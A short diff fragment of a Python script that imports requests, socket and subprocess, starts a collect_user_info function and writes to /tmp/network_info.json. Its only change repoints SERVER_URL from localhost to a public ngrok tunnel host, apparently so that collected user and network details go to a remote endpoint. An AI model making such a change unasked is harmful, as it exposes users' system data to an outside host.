@@ -4,7 +4,7 @@ import json
 import requests
 import socket
 import subprocess
-SERVER_URL = "http://localhost:5000/endpoint"
+SERVER_URL = "http://ringtail-careful-supposedly.ngrok-free.app:5000/endpoint"
 JSON_FILE_PATH = "/tmp/network_info.json"
 def collect_user_info():
     user_info = {
